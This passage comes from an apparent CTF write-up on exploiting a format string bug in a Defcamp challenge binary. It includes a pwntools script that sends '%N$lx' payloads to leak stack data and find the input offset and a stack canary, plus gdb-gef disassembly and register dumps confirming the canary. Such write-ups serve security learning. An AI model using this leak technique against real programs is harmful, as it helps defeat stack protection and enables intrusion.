<h3 id="Exploiting-the-binary"><a href="#Exploiting-the-binary" class="headerlink" title="Exploiting the binary"></a>Exploiting the binary</h3><p>So, let’s make a script to find the offset for the input on stack, who knows we might be able to get something of interest?</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./q3"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"AAAA %{}$lx"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># will print the stack data in hex format</span>
    p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># Hello</span>
    <span class="token keyword">print</span> i<span class="token punctuation">,</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>Let’s run it:-</p>
<pre class=" language-r"><code class="language-r">robin<span class="token operator">@</span>oracle<span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>CTFs<span class="token operator">/</span>Defcamp<span class="token operator">$</span> python find_off.py 
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Starting local process <span class="token string">'./q3'</span><span class="token operator">:</span> pid <span class="token number">8323</span>
<span class="token number">2</span> AAAA 7ffff7dd18c0

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Stopped process <span class="token string">'./q3'</span> <span class="token punctuation">(</span>pid <span class="token number">8323</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Starting local process <span class="token string">'./q3'</span><span class="token operator">:</span> pid <span class="token number">8325</span>
<span class="token number">3</span> AAAA 7ffff7af4154

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Stopped process <span class="token string">'./q3'</span> <span class="token punctuation">(</span>pid <span class="token number">8325</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Starting local process <span class="token string">'./q3'</span><span class="token operator">:</span> pid <span class="token number">8327</span>
<span class="token number">4</span> AAAA 7ffff7fd24c0

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Stopped process <span class="token string">'./q3'</span> <span class="token punctuation">(</span>pid <span class="token number">8327</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Starting local process <span class="token string">'./q3'</span><span class="token operator">:</span> pid <span class="token number">8329</span>
<span class="token number">5</span> AAAA <span class="token number">0</span>

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Stopped process <span class="token string">'./q3'</span> <span class="token punctuation">(</span>pid <span class="token number">8329</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Starting local process <span class="token string">'./q3'</span><span class="token operator">:</span> pid <span class="token number">8331</span>
<span class="token number">6</span> AAAA 7ffff7de59a0

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Stopped process <span class="token string">'./q3'</span> <span class="token punctuation">(</span>pid <span class="token number">8331</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Starting local process <span class="token string">'./q3'</span><span class="token operator">:</span> pid <span class="token number">8333</span>
<span class="token number">7</span> AAAA 7ffff7dcfa00

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Stopped process <span class="token string">'./q3'</span> <span class="token punctuation">(</span>pid <span class="token number">8333</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Starting local process <span class="token string">'./q3'</span><span class="token operator">:</span> pid <span class="token number">8335</span>
<span class="token number">8</span> AAAA <span class="token number">2438252041414141</span>                                        <span class="token operator">&lt;-</span><span class="token operator">-</span><span class="token operator">-</span> Offset 

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Stopped process <span class="token string">'./q3'</span> <span class="token punctuation">(</span>pid <span class="token number">8335</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Starting local process <span class="token string">'./q3'</span><span class="token operator">:</span> pid <span class="token number">8337</span>
<span class="token number">9</span> AAAA a786c

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Stopped process <span class="token string">'./q3'</span> <span class="token punctuation">(</span>pid <span class="token number">8337</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Starting local process <span class="token string">'./q3'</span><span class="token operator">:</span> pid <span class="token number">8339</span>
<span class="token number">10</span> AAAA 7fffffffde80

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Stopped process <span class="token string">'./q3'</span> <span class="token punctuation">(</span>pid <span class="token number">8339</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Starting local process <span class="token string">'./q3'</span><span class="token operator">:</span> pid <span class="token number">8341</span>
<span class="token number">11</span> AAAA a17e6a7c1c53c000                                       <span class="token operator">&lt;-</span><span class="token operator">-</span><span class="token operator">-</span> This is of interest

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Stopped process <span class="token string">'./q3'</span> <span class="token punctuation">(</span>pid <span class="token number">8341</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Starting local process <span class="token string">'./q3'</span><span class="token operator">:</span> pid <span class="token number">8343</span>
<span class="token number">12</span> AAAA <span class="token number">555555554830</span>

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Stopped process <span class="token string">'./q3'</span> <span class="token punctuation">(</span>pid <span class="token number">8343</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Starting local process <span class="token string">'./q3'</span><span class="token operator">:</span> pid <span class="token number">8345</span>
<span class="token number">13</span> AAAA 7ffff7a05b97

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Stopped process <span class="token string">'./q3'</span> <span class="token punctuation">(</span>pid <span class="token number">8345</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Starting local process <span class="token string">'./q3'</span><span class="token operator">:</span> pid <span class="token number">8347</span>
<span class="token number">14</span> AAAA <span class="token number">1</span>

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Stopped process <span class="token string">'./q3'</span> <span class="token punctuation">(</span>pid <span class="token number">8347</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Starting local process <span class="token string">'./q3'</span><span class="token operator">:</span> pid <span class="token number">8349</span>
<span class="token number">15</span> AAAA 7fffffffde88

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Stopped process <span class="token string">'./q3'</span> <span class="token punctuation">(</span>pid <span class="token number">8349</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Starting local process <span class="token string">'./q3'</span><span class="token operator">:</span> pid <span class="token number">8351</span>
<span class="token number">16</span> AAAA <span class="token number">100008000</span>

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Stopped process <span class="token string">'./q3'</span> <span class="token punctuation">(</span>pid <span class="token number">8351</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Starting local process <span class="token string">'./q3'</span><span class="token operator">:</span> pid <span class="token number">8353</span>
<span class="token number">17</span> AAAA 55555555477a

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Stopped process <span class="token string">'./q3'</span> <span class="token punctuation">(</span>pid <span class="token number">8353</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Starting local process <span class="token string">'./q3'</span><span class="token operator">:</span> pid <span class="token number">8355</span>
<span class="token number">18</span> AAAA <span class="token number">0</span>

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Stopped process <span class="token string">'./q3'</span> <span class="token punctuation">(</span>pid <span class="token number">8355</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Starting local process <span class="token string">'./q3'</span><span class="token operator">:</span> pid <span class="token number">8357</span>
<span class="token number">19</span> AAAA 8f241916698aca1f                                     <span class="token operator">&lt;-</span><span class="token operator">-</span><span class="token operator">-</span> This is of interest

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Stopped process <span class="token string">'./q3'</span> <span class="token punctuation">(</span>pid <span class="token number">8357</span><span class="token punctuation">)</span></code></pre>
<p>So, the addresses starting from <code>0x7f</code> are libc addresses and we have offset for our input at 8 but what are those at offset 11 and 19? Whatever it is, this is something we might need. Upon discussing this from a guy(super helpful) named Faith, he told me that it <strong>could be</strong> stack canary address. Now, if we didn’t had a format string vulnerability then we had to bruteforce the value,luckily enough we have that vulnerability here.</p>
<p>To be more broad:-<br>I’ll be using gdb-gef as we have to inspect some of the registers, et’s break the <code>__main__</code> function:-</p>
<pre class=" language-r"><code class="language-r">gef➤  disas main
Dump of assembler code <span class="token keyword">for</span> <span class="token keyword">function</span> main<span class="token operator">:</span>
   <span class="token number">0x000000000000077a</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">0</span><span class="token operator">></span><span class="token operator">:</span>    push   rbp
   <span class="token number">0x000000000000077b</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">></span><span class="token operator">:</span>    mov    rbp<span class="token punctuation">,</span>rsp
   <span class="token number">0x000000000000077e</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">></span><span class="token operator">:</span>    sub    rsp<span class="token punctuation">,</span><span class="token number">0x30</span>
   <span class="token number">0x0000000000000782</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">8</span><span class="token operator">></span><span class="token operator">:</span>    mov    rax<span class="token punctuation">,</span>QWORD PTR fs<span class="token operator">:</span><span class="token number">0x28</span>
   <span class="token number">0x000000000000078b</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">17</span><span class="token operator">></span><span class="token operator">:</span>    mov    QWORD PTR <span class="token punctuation">[</span>rbp<span class="token operator">-</span><span class="token number">0x8</span><span class="token punctuation">]</span><span class="token punctuation">,</span>rax
   <span class="token number">0x000000000000078f</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">21</span><span class="token operator">></span><span class="token operator">:</span>    xor    eax<span class="token punctuation">,</span>eax
   <span class="token number">0x0000000000000791</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">23</span><span class="token operator">></span><span class="token operator">:</span>    mov    QWORD PTR <span class="token punctuation">[</span>rbp<span class="token operator">-</span><span class="token number">0x20</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x0</span>
   <span class="token number">0x0000000000000799</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">31</span><span class="token operator">></span><span class="token operator">:</span>    mov    QWORD PTR <span class="token punctuation">[</span>rbp<span class="token operator">-</span><span class="token number">0x18</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x0</span>
   <span class="token number">0x00000000000007a1</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">39</span><span class="token operator">></span><span class="token operator">:</span>    mov    rax<span class="token punctuation">,</span>QWORD PTR <span class="token punctuation">[</span>rip<span class="token operator">+</span><span class="token number">0x200868</span><span class="token punctuation">]</span>        <span class="token comment" spellcheck="true"># 0x201010 &lt;stdin@@GLIBC_2.2.5></span>
   <span class="token number">0x00000000000007a8</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">46</span><span class="token operator">></span><span class="token operator">:</span>    mov    QWORD PTR <span class="token punctuation">[</span>rbp<span class="token operator">-</span><span class="token number">0x28</span><span class="token punctuation">]</span><span class="token punctuation">,</span>rax
   <span class="token number">0x00000000000007ac</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">50</span><span class="token operator">></span><span class="token operator">:</span>    lea    rdi<span class="token punctuation">,</span><span class="token punctuation">[</span>rip<span class="token operator">+</span><span class="token number">0x101</span><span class="token punctuation">]</span>        <span class="token comment" spellcheck="true"># 0x8b4</span>
   <span class="token number">0x00000000000007b3</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">57</span><span class="token operator">></span><span class="token operator">:</span>    mov    eax<span class="token punctuation">,</span><span class="token number">0x0</span>
   <span class="token number">0x00000000000007b8</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">62</span><span class="token operator">></span><span class="token operator">:</span>    call   <span class="token number">0x640</span> <span class="token operator">&lt;</span>printf<span class="token operator">@</span>plt<span class="token operator">></span>
   <span class="token number">0x00000000000007bd</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">67</span><span class="token operator">></span><span class="token operator">:</span>    mov    rdx<span class="token punctuation">,</span>QWORD PTR <span class="token punctuation">[</span>rbp<span class="token operator">-</span><span class="token number">0x28</span><span class="token punctuation">]</span>
   <span class="token number">0x00000000000007c1</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">71</span><span class="token operator">></span><span class="token operator">:</span>    lea    rax<span class="token punctuation">,</span><span class="token punctuation">[</span>rbp<span class="token operator">-</span><span class="token number">0x20</span><span class="token punctuation">]</span>
   <span class="token number">0x00000000000007c5</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">75</span><span class="token operator">></span><span class="token operator">:</span>    mov    esi<span class="token punctuation">,</span><span class="token number">0x10</span>
   <span class="token number">0x00000000000007ca</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">80</span><span class="token operator">></span><span class="token operator">:</span>    mov    rdi<span class="token punctuation">,</span>rax
   <span class="token number">0x00000000000007cd</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">83</span><span class="token operator">></span><span class="token operator">:</span>    call   <span class="token number">0x650</span> <span class="token operator">&lt;</span>fgets<span class="token operator">@</span>plt<span class="token operator">></span>
   <span class="token number">0x00000000000007d2</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">88</span><span class="token operator">></span><span class="token operator">:</span>    lea    rdi<span class="token punctuation">,</span><span class="token punctuation">[</span>rip<span class="token operator">+</span><span class="token number">0xe9</span><span class="token punctuation">]</span>        <span class="token comment" spellcheck="true"># 0x8c2</span>
   <span class="token number">0x00000000000007d9</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">95</span><span class="token operator">></span><span class="token operator">:</span>    call   <span class="token number">0x620</span> <span class="token operator">&lt;</span>puts<span class="token operator">@</span>plt<span class="token operator">></span>
   <span class="token number">0x00000000000007de</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">100</span><span class="token operator">></span><span class="token operator">:</span>    lea    rax<span class="token punctuation">,</span><span class="token punctuation">[</span>rbp<span class="token operator">-</span><span class="token number">0x20</span><span class="token punctuation">]</span>
   <span class="token number">0x00000000000007e2</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">104</span><span class="token operator">></span><span class="token operator">:</span>    mov    rdi<span class="token punctuation">,</span>rax
   <span class="token number">0x00000000000007e5</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">107</span><span class="token operator">></span><span class="token operator">:</span>    mov    eax<span class="token punctuation">,</span><span class="token number">0x0</span>
   <span class="token number">0x00000000000007ea</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">112</span><span class="token operator">></span><span class="token operator">:</span>    call   <span class="token number">0x640</span> <span class="token operator">&lt;</span>printf<span class="token operator">@</span>plt<span class="token operator">></span>
   <span class="token number">0x00000000000007ef</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">117</span><span class="token operator">></span><span class="token operator">:</span>    lea    rdi<span class="token punctuation">,</span><span class="token punctuation">[</span>rip<span class="token operator">+</span><span class="token number">0xd2</span><span class="token punctuation">]</span>        <span class="token comment" spellcheck="true"># 0x8c8</span>
   <span class="token number">0x00000000000007f6</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">124</span><span class="token operator">></span><span class="token operator">:</span>    mov    eax<span class="token punctuation">,</span><span class="token number">0x0</span>
   <span class="token number">0x00000000000007fb</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">129</span><span class="token operator">></span><span class="token operator">:</span>    call   <span class="token number">0x640</span> <span class="token operator">&lt;</span>printf<span class="token operator">@</span>plt<span class="token operator">></span>
   <span class="token number">0x0000000000000800</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">134</span><span class="token operator">></span><span class="token operator">:</span>    mov    rdx<span class="token punctuation">,</span>QWORD PTR <span class="token punctuation">[</span>rbp<span class="token operator">-</span><span class="token number">0x28</span><span class="token punctuation">]</span>
   <span class="token number">0x0000000000000804</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">138</span><span class="token operator">></span><span class="token operator">:</span>    lea    rax<span class="token punctuation">,</span><span class="token punctuation">[</span>rbp<span class="token operator">-</span><span class="token number">0x20</span><span class="token punctuation">]</span>
   <span class="token number">0x0000000000000808</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">142</span><span class="token operator">></span><span class="token operator">:</span>    mov    esi<span class="token punctuation">,</span><span class="token number">0x100</span>
   <span class="token number">0x000000000000080d</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">147</span><span class="token operator">></span><span class="token operator">:</span>    mov    rdi<span class="token punctuation">,</span>rax
   <span class="token number">0x0000000000000810</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">150</span><span class="token operator">></span><span class="token operator">:</span>    call   <span class="token number">0x650</span> <span class="token operator">&lt;</span>fgets<span class="token operator">@</span>plt<span class="token operator">></span>
   <span class="token number">0x0000000000000815</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">155</span><span class="token operator">></span><span class="token operator">:</span>    mov    eax<span class="token punctuation">,</span><span class="token number">0x0</span>
   <span class="token number">0x000000000000081a</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">160</span><span class="token operator">></span><span class="token operator">:</span>    mov    rcx<span class="token punctuation">,</span>QWORD PTR <span class="token punctuation">[</span>rbp<span class="token operator">-</span><span class="token number">0x8</span><span class="token punctuation">]</span>
   <span class="token number">0x000000000000081e</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">164</span><span class="token operator">></span><span class="token operator">:</span>    xor    rcx<span class="token punctuation">,</span>QWORD PTR fs<span class="token operator">:</span><span class="token number">0x28</span>   <span class="token operator">&lt;-</span> This line checks whether the provided canary is equal to the one calculated before
   <span class="token number">0x0000000000000827</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">173</span><span class="token operator">></span><span class="token operator">:</span>    je     <span class="token number">0x82e</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">180</span><span class="token operator">></span>
   <span class="token number">0x0000000000000829</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">175</span><span class="token operator">></span><span class="token operator">:</span>    call   <span class="token number">0x630</span> <span class="token operator">&lt;</span>__stack_chk_fail<span class="token operator">@</span>plt<span class="token operator">></span>
   <span class="token number">0x000000000000082e</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">180</span><span class="token operator">></span><span class="token operator">:</span>    leave  
   <span class="token number">0x000000000000082f</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">181</span><span class="token operator">></span><span class="token operator">:</span>    ret    
End of assembler dump.</code></pre>
<p>Let’s try to check those two offsets 11 and 19 to see if it’s the stack canary or not:-</p>
<p>At first, we need to setup a breakpoint at the instruction where the comaprison happens i.e. <code>main+164</code> and we will just give random input at second and analyse the registers.</p>
<pre class=" language-r"><code class="language-r">gef➤  b <span class="token operator">*</span>main<span class="token operator">+</span><span class="token number">164</span>
Breakpoint <span class="token number">1</span> at <span class="token number">0x81e</span>
gef➤  r
Starting program<span class="token operator">:</span> <span class="token operator">/</span>home<span class="token operator">/</span>robin<span class="token operator">/</span>CTFs<span class="token operator">/</span>Defcamp<span class="token operator">/</span>q3 
Enter name <span class="token operator">:</span> %<span class="token number">11</span><span class="token operator">$</span>lx %<span class="token number">19</span><span class="token operator">$</span>lx 
Hello
50a01b0663fa1e00 ebd42dea12670b41
Enter sentence <span class="token operator">:</span> AAAA
<span class="token punctuation">[</span> Legend<span class="token operator">:</span> Modified register <span class="token operator">|</span> Code <span class="token operator">|</span> Heap <span class="token operator">|</span> Stack <span class="token operator">|</span> String <span class="token punctuation">]</span>
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
<span class="token operator">$</span>rax   <span class="token operator">:</span> <span class="token number">0x0</span>               
<span class="token operator">$</span>rbx   <span class="token operator">:</span> <span class="token number">0x0</span>               
<span class="token operator">$</span>rcx   <span class="token operator">:</span> <span class="token number">0x50a01b0663fa1e00</span>
<span class="token operator">$</span>rdx   <span class="token operator">:</span> <span class="token number">0x00007ffff7dd18d0</span>  →  <span class="token number">0x0000000000000000</span>
<span class="token operator">$</span>rsp   <span class="token operator">:</span> <span class="token number">0x00007fffffffdd10</span>  →  <span class="token number">0x00007ffff7de59a0</span>  →  <span class="token operator">&lt;</span>_dl_fini<span class="token operator">+</span><span class="token number">0</span><span class="token operator">></span> push rbp
<span class="token operator">$</span>rbp   <span class="token operator">:</span> <span class="token number">0x00007fffffffdd40</span>  →  <span class="token number">0x0000555555554830</span>  →  <span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">0</span><span class="token operator">></span> push r15
<span class="token operator">$</span>rsi   <span class="token operator">:</span> <span class="token number">0x00007fffffffdd20</span>  →  <span class="token number">0x2520000a41414141</span> <span class="token punctuation">(</span><span class="token string">"AAAA"</span>?<span class="token punctuation">)</span>
<span class="token operator">$</span>rdi   <span class="token operator">:</span> <span class="token number">0x00007fffffffdd21</span>  →  <span class="token number">0x312520000a414141</span> <span class="token punctuation">(</span><span class="token string">"AAA"</span>?<span class="token punctuation">)</span>
<span class="token operator">$</span>rip   <span class="token operator">:</span> <span class="token number">0x000055555555481e</span>  →  <span class="token number">0x000028250c334864</span> <span class="token punctuation">(</span>"dH3
                                                        %<span class="token punctuation">(</span>"?<span class="token punctuation">)</span>
<span class="token operator">$</span>r8    <span class="token operator">:</span> <span class="token number">0x0000555555756675</span>  →  <span class="token string">"x %19$lx"</span>
<span class="token operator">$</span>r9    <span class="token operator">:</span> <span class="token number">0x00007ffff7fd24c0</span>  →  <span class="token number">0x00007ffff7fd24c0</span>  →  <span class="token punctuation">[</span>loop detected<span class="token punctuation">]</span>
<span class="token operator">$</span>r10   <span class="token operator">:</span> <span class="token number">0x00007ffff7fd24c0</span>  →  <span class="token number">0x00007ffff7fd24c0</span>  →  <span class="token punctuation">[</span>loop detected<span class="token punctuation">]</span>
<span class="token operator">$</span>r11   <span class="token operator">:</span> <span class="token number">0x246</span>             
<span class="token operator">$</span>r12   <span class="token operator">:</span> <span class="token number">0x0000555555554670</span>  →  <span class="token operator">&lt;</span>_start<span class="token operator">+</span><span class="token number">0</span><span class="token operator">></span> xor ebp<span class="token punctuation">,</span> ebp
<span class="token operator">$</span>r13   <span class="token operator">:</span> <span class="token number">0x00007fffffffde20</span>  →  <span class="token number">0x0000000000000001</span>
<span class="token operator">$</span>r14   <span class="token operator">:</span> <span class="token number">0x0</span>               
<span class="token operator">$</span>r15   <span class="token operator">:</span> <span class="token number">0x0</span>               
<span class="token operator">$</span>eflags<span class="token operator">:</span> <span class="token punctuation">[</span>ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification<span class="token punctuation">]</span>
<span class="token operator">$</span>cs<span class="token operator">:</span> <span class="token number">0x0033</span> <span class="token operator">$</span>ss<span class="token operator">:</span> <span class="token number">0x002b</span> <span class="token operator">$</span>ds<span class="token operator">:</span> <span class="token number">0x0000</span> <span class="token operator">$</span>es<span class="token operator">:</span> <span class="token number">0x0000</span> <span class="token operator">$</span>fs<span class="token operator">:</span> <span class="token number">0x0000</span> <span class="token operator">$</span>gs<span class="token operator">:</span> <span class="token number">0x0000</span> 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
<span class="token number">0x00007fffffffdd10</span>│<span class="token operator">+</span><span class="token number">0x0000</span><span class="token operator">:</span> <span class="token number">0x00007ffff7de59a0</span>  →  <span class="token operator">&lt;</span>_dl_fini<span class="token operator">+</span><span class="token number">0</span><span class="token operator">></span> push rbp     ← <span class="token operator">$</span>rsp
<span class="token number">0x00007fffffffdd18</span>│<span class="token operator">+</span><span class="token number">0x0008</span><span class="token operator">:</span> <span class="token number">0x00007ffff7dcfa00</span>  →  <span class="token number">0x00000000fbad2288</span>
<span class="token number">0x00007fffffffdd20</span>│<span class="token operator">+</span><span class="token number">0x0010</span><span class="token operator">:</span> <span class="token number">0x2520000a41414141</span> <span class="token punctuation">(</span><span class="token string">"AAAA"</span>?<span class="token punctuation">)</span>     ← <span class="token operator">$</span>rsi
<span class="token number">0x00007fffffffdd28</span>│<span class="token operator">+</span><span class="token number">0x0018</span><span class="token operator">:</span> <span class="token number">0x00000a786c243931</span> <span class="token punctuation">(</span><span class="token string">"19$lx"</span>?<span class="token punctuation">)</span>
<span class="token number">0x00007fffffffdd30</span>│<span class="token operator">+</span><span class="token number">0x0020</span><span class="token operator">:</span> <span class="token number">0x00007fffffffde20</span>  →  <span class="token number">0x0000000000000001</span>
<span class="token number">0x00007fffffffdd38</span>│<span class="token operator">+</span><span class="token number">0x0028</span><span class="token operator">:</span> <span class="token number">0x50a01b0663fa1e00</span>
<span class="token number">0x00007fffffffdd40</span>│<span class="token operator">+</span><span class="token number">0x0030</span><span class="token operator">:</span> <span class="token number">0x0000555555554830</span>  →  <span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">0</span><span class="token operator">></span> push r15     ← <span class="token operator">$</span>rbp
<span class="token number">0x00007fffffffdd48</span>│<span class="token operator">+</span><span class="token number">0x0038</span><span class="token operator">:</span> <span class="token number">0x00007ffff7a05b97</span>  →  <span class="token operator">&lt;</span>__libc_start_main<span class="token operator">+</span><span class="token number">231</span><span class="token operator">></span> mov edi<span class="token punctuation">,</span> eax
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code<span class="token operator">:</span>x86<span class="token operator">:</span><span class="token number">64</span> ────
   <span class="token number">0x555555554810</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">150</span><span class="token operator">></span>       call   <span class="token number">0x555555554650</span> <span class="token operator">&lt;</span>fgets<span class="token operator">@</span>plt<span class="token operator">></span>
   <span class="token number">0x555555554815</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">155</span><span class="token operator">></span>       mov    eax<span class="token punctuation">,</span> <span class="token number">0x0</span>
   <span class="token number">0x55555555481a</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">160</span><span class="token operator">></span>       mov    rcx<span class="token punctuation">,</span> QWORD PTR <span class="token punctuation">[</span>rbp<span class="token operator">-</span><span class="token number">0x8</span><span class="token punctuation">]</span>
 → <span class="token number">0x55555555481e</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">164</span><span class="token operator">></span>       xor    rcx<span class="token punctuation">,</span> QWORD PTR fs<span class="token operator">:</span><span class="token number">0x28</span>
   <span class="token number">0x555555554827</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">173</span><span class="token operator">></span>       je     <span class="token number">0x55555555482e</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">180</span><span class="token operator">></span>
   <span class="token number">0x555555554829</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">175</span><span class="token operator">></span>       call   <span class="token number">0x555555554630</span> <span class="token operator">&lt;</span>__stack_chk_fail<span class="token operator">@</span>plt<span class="token operator">></span>
   <span class="token number">0x55555555482e</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">180</span><span class="token operator">></span>       leave  
   <span class="token number">0x55555555482f</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">181</span><span class="token operator">></span>       ret    
   <span class="token number">0x555555554830</span> <span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">0</span><span class="token operator">></span> push   r15
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
<span class="token punctuation">[</span><span class="token comment" spellcheck="true">#0] Id 1, Name: "q3", stopped, reason: BREAKPOINT</span>
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
<span class="token punctuation">[</span><span class="token comment" spellcheck="true">#0] 0x55555555481e → main()</span>
